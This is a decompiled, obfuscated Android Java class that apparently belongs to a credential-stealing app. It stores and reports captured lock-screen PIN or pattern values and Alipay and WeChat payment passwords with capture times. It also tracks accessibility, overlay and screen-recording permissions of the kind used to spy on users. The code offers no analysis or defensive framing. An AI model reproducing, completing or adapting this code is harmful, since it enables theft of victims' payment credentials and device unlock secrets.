package p000;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Build;
import com.storm.safe.rock.util.StringUtil;
import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* renamed from: as */
/* loaded from: classes2.dex */
public final class C0107as {

    /* renamed from: a3 */
    public static final C0106ar f45610a3 = new C0106ar(null);

    /* renamed from: a4 */
    public static final String f45611a4 = StringUtil.m212470a0("KlUYKkwhMz5WIjhOHihJBw8vRyU+SxQ+");

    /* renamed from: a5 */
    public static final String f45612a5 = StringUtil.m212470a0("PFwSMkwsMz5WIjhOHihJBw8vRyU+SxQ+");

    /* renamed from: a6 */
    public static final String f45613a6 = StringUtil.m212470a0("J1YSMXIoDT1EJiRLFQVJPRgrVCUuXQ==");

    /* renamed from: a7 */
    public static final String f45614a7 = StringUtil.m212470a0("J1YSMXIoDT1EJiRLFQVZIRwr");

    /* renamed from: a8 */
    public static final String f45615a8 = StringUtil.m212470a0("J1YSMXIoDT1EJiRLFQVbOQA7Ug==");

    /* renamed from: a9 */
    public static final String f45616a9 = StringUtil.m212470a0("J1YSMXIoDT1EJiRLFQVOORw6QiMuZgUzQD0=");

    /* renamed from: b0 */
    public static volatile C0107as f45617b0;

    /* renamed from: a0 */
    public final Context f45618a0;

    /* renamed from: a1 */
    public final SharedPreferences f45619a1;

    /* renamed from: a2 */
    public final SimpleDateFormat f45620a2 = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault());

    public C0107as(Context context) {
        this.f45618a0 = context;
        this.f45619a1 = context.getSharedPreferences("app_status", 0);
    }

    /* renamed from: a0 */
    public final String m210501a0() {
        StringBuilder sb = new StringBuilder("==========================================\n       应用状态记录文件\n==========================================\n");
        sb.append("更新时间: " + this.f45620a2.format(new Date()));
        sb.append('\n');
        sb.append("设备型号: " + Build.MANUFACTURER + " " + Build.MODEL);
        sb.append('\n');
        sb.append("Android版本: " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")");
        sb.append("\n\n========== 安装状态 ==========\n");
        SharedPreferences sharedPreferences = this.f45619a1;
        sb.append("安装完成: " + sharedPreferences.getBoolean("installation_complete", false));
        sb.append('\n');
        sb.append("安装时间: ".concat(m210502a1(sharedPreferences.getLong("installation_time", 0L))));
        sb.append('\n');
        sb.append("首次启动: " + sharedPreferences.getBoolean("first_launch", true));
        sb.append("\n\n========== 配置状态 ==========\n");
        sb.append("配置完成: " + sharedPreferences.getBoolean("config_complete", false));
        sb.append('\n');
        sb.append("配置完成时间: ".concat(m210502a1(sharedPreferences.getLong("config_complete_time", 0L))));
        sb.append("\n\n========== 锁屏密码状态 ==========\n");
        sb.append("已检测: " + sharedPreferences.getBoolean(f45613a6, false));
        sb.append('\n');
        sb.append("密码类型: ".concat(m210503a2()));
        sb.append('\n');
        sb.append("是否4位PIN: " + m210503a2().equals("4pin"));
        sb.append('\n');
        sb.append("是否6位PIN: " + m210503a2().equals("6pin"));
        sb.append('\n');
        sb.append("是否图案: " + m210503a2().equals("pattern"));
        sb.append('\n');
        sb.append("是否混合: " + m210503a2().equals("mixed"));
        sb.append('\n');
        String string = sharedPreferences.getString(f45615a8, "");
        if (string == null) {
            string = "";
        }
        sb.append("密码值: ".concat(string.length() > 0 ? "已获取" : "未获取"));
        sb.append('\n');
        sb.append("获取时间: ".concat(m210502a1(sharedPreferences.getLong(f45616a9, 0L))));
        sb.append("\n\n========== 支付宝密码状态 ==========\n");
        sb.append("已捕获: " + sharedPreferences.getBoolean(f45611a4, false));
        sb.append('\n');
        String string2 = sharedPreferences.getString("alipay_password_type", "none");
        if (string2 == null) {
            string2 = "none";
        }
        sb.append("密码类型: ".concat(string2));
        sb.append('\n');
        String string3 = sharedPreferences.getString("alipay_password_value", "");
        if (string3 == null) {
            string3 = "";
        }
        sb.append("密码值: ".concat(string3.length() > 0 ? "已获取" : "未获取"));
        sb.append('\n');
        sb.append("捕获时间: ".concat(m210502a1(sharedPreferences.getLong("alipay_capture_time", 0L))));
        sb.append("\n\n========== 微信密码状态 ==========\n");
        sb.append("已捕获: " + sharedPreferences.getBoolean(f45612a5, false));
        sb.append('\n');
        String string4 = sharedPreferences.getString("wechat_password_type", "none");
        sb.append("密码类型: ".concat(string4 != null ? string4 : "none"));
        sb.append('\n');
        String string5 = sharedPreferences.getString("wechat_password_value", "");
        sb.append("密码值: ".concat((string5 != null ? string5 : "").length() > 0 ? "已获取" : "未获取"));
        sb.append('\n');
        sb.append("捕获时间: ".concat(m210502a1(sharedPreferences.getLong("wechat_capture_time", 0L))));
        sb.append("\n\n========== 权限状态 ==========\n");
        sb.append("无障碍服务: " + sharedPreferences.getBoolean("accessibility_enabled", false));
        sb.append('\n');
        sb.append("悬浮窗权限: " + sharedPreferences.getBoolean("overlay_enabled", false));
        sb.append('\n');
        sb.append("屏幕录制权限: " + sharedPreferences.getBoolean("media_projection_enabled", false));
        sb.append('\n');
        sb.append("系统设置权限: " + sharedPreferences.getBoolean("write_settings_enabled", false));
        sb.append("\n\n==========================================\n  使用说明:\n  - 此文件记录应用的关键状态\n  - 可用于条件判断和调试\n  - 文件位置: /data/data/<包名>/files/\n==========================================\n");
        String string6 = sb.toString();
        t60.m214694b5(string6, "sb.toString()");
        return string6;
    }

    /* renamed from: a1 */
    public final String m210502a1(long j) {
        if (j <= 0) {
            return "未记录";
        }
        String str = this.f45620a2.format(new Date(j));
        t60.m214694b5(str, "{\n            dateFormat…ate(timestamp))\n        }");
        return str;
    }

    /* renamed from: a2 */
    public final String m210503a2() {
        String string = this.f45619a1.getString(f45614a7, "none");
        return string == null ? "none" : string;
    }

    /* renamed from: a3 */
    public final String m210504a3() {
        try {
            File file = new File(this.f45618a0.getFilesDir(), "app_status.txt");
            return file.exists() ? AbstractC1517zh.m215420f8(file) : "状态文件不存在";
        } catch (Exception e) {
            t60.m214705c6("AppStatusManager", "读取状态文件失败", e);
            return AbstractC0003a2.m48c9("读取失败: ", e.getMessage());
        }
    }

    /* renamed from: a4 */
    public final void m210505a4() {
        try {
            AbstractC1517zh.m215422g0(new File(this.f45618a0.getFilesDir(), "app_status.txt"), m210501a0());
        } catch (Exception e) {
            t60.m214705c6("AppStatusManager", "保存状态文件失败", e);
        }
    }

    /* renamed from: a5 */
    public final void m210506a5(String str, boolean z, String str2) {
        t60.m214695b6(str2, "value");
        SharedPreferences.Editor editorEdit = this.f45619a1.edit();
        editorEdit.putBoolean(f45611a4, z);
        editorEdit.putString("alipay_password_type", str);
        editorEdit.putString("alipay_password_value", str2);
        if (z) {
            editorEdit.putLong("alipay_capture_time", System.currentTimeMillis());
        }
        editorEdit.apply();
        m210505a4();
    }

    /* renamed from: a6 */
    public final void m210507a6(String str, boolean z, String str2) {
        t60.m214695b6(str2, "value");
        String str3 = f45615a8;
        SharedPreferences sharedPreferences = this.f45619a1;
        if (!z || (str2.length() <= 0 && (str2 = sharedPreferences.getString(str3, "")) == null)) {
            str2 = "";
        }
        if (!z || str.equals("none") || str.equals("unknown")) {
            if (z) {
                String strM210503a2 = m210503a2();
                if (!strM210503a2.equals("none") && !strM210503a2.equals("unknown")) {
                    str = strM210503a2;
                }
            } else {
                str = "none";
            }
        }
        SharedPreferences.Editor editorEdit = sharedPreferences.edit();
        editorEdit.putBoolean(f45613a6, z);
        editorEdit.putString(f45614a7, str);
        editorEdit.putString(str3, str2);
        String str4 = f45616a9;
        if (!z || str2.length() <= 0) {
            editorEdit.putLong(str4, 0L);
        } else {
            editorEdit.putLong(str4, System.currentTimeMillis());
        }
        editorEdit.apply();
        m210505a4();
    }

    /* renamed from: a7 */
    public final void m210508a7(String str, boolean z, String str2) {
        t60.m214695b6(str2, "value");
        SharedPreferences.Editor editorEdit = this.f45619a1.edit();
        editorEdit.putBoolean(f45612a5, z);
        editorEdit.putString("wechat_password_type", str);
        editorEdit.putString("wechat_password_value", str2);
        if (z) {
            editorEdit.putLong("wechat_capture_time", System.currentTimeMillis());
        }
        editorEdit.apply();
        m210505a4();
    }
}
